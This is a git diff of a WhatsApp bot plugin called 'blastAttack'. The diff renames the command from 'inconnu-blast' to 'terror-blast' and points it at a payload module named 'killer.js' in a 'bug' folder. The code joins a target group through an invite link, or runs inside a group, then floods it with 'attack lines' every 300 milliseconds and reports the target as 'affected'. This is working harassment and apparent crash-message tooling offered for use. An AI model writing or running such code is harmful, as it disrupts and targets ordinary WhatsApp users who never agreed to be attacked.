@@ -1,4 +1,4 @@
-import bugchat from '../../bug/inconnu3.js';
+import bugchat from '../../bug/killer.js';
 import config from '../../config.cjs';
 
 const blastAttack = async (m, Matrix) => {
@@ -7,7 +7,7 @@ const blastAttack = async (m, Matrix) => {
     ? m.body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
     : '';
 
-  if (cmd !== 'inconnu-blast') return;
+  if (cmd !== 'terror-blast') return;
 
   const botNumber = await Matrix.decodeJid(Matrix.user.id);
   const senderId = m.sender;
@@ -30,12 +30,12 @@ const blastAttack = async (m, Matrix) => {
 
       for (let line of attackLines) {
         await Matrix.sendMessage(groupId, {
-          text: `💥 ${line}\n_INCONNU-XD V2 STRIKE_`,
+          text: `💥 ${line}\n_TERROR-XMD- STRIKE_`,
         });
         await new Promise(r => setTimeout(r, 300));
       }
 
-      await Matrix.sendMessage(senderId, { text: `✅ *INCONNU-BLAST* completed on group.` }, { quoted: m });
+      await Matrix.sendMessage(senderId, { text: `✅ *TERROR-BLAST* completed on group.` }, { quoted: m });
 
     } catch (e) {
       return await Matrix.sendMessage(senderId, { text: "❌ Failed to join group. Link invalid or restricted." }, { quoted: m });
@@ -47,18 +47,18 @@ const blastAttack = async (m, Matrix) => {
   // Cas 2: Utilisé directement dans un groupe
   if (m.isGroup) {
     await Matrix.sendMessage(m.from, {
-      text: `🚨 *INCONNU-BLAST LAUNCHED*\n🧨 Target: ${m.from}\n💬 Messages: ${attackLines.length}`,
+      text: `🚨 *TERROR-BLAST LAUNCHED*\n🧨 Target: ${m.from}\n💬 Messages: ${attackLines.length}`,
     }, { quoted: m });
 
     for (let line of attackLines) {
       await Matrix.sendMessage(m.from, {
-        text: `⚠️ ${line}\n_BY INCONNU BOY 🦋_`,
+        text: `⚠️ ${line}\n_BY HACKLINK TECH.INC 🦋_`,
       });
       await new Promise(r => setTimeout(r, 300));
     }
 
     await Matrix.sendMessage(m.from, {
-      text: `✅ *INCONNU-BLAST COMPLETE*\n🔥 Target group affected.`,
+      text: `✅ *TERROR-BLAST COMPLETE*\n🔥 Target group affected.`,
     }, { quoted: m });
 
     return;
@@ -66,7 +66,7 @@ const blastAttack = async (m, Matrix) => {
 
   // Cas 3: ni groupe ni lien fourni
   await Matrix.sendMessage(m.from, {
-    text: `❌ Usage :\n.inconnu-blast https://chat.whatsapp.com/xxxxx (from DM)\n.inconnu-blast (from group)`,
+    text: `❌ Usage :\n.terror-blast https://chat.whatsapp.com/xxxxx (from DM)\n.terror-blast (from group)`,
   }, { quoted: m });
 };
 
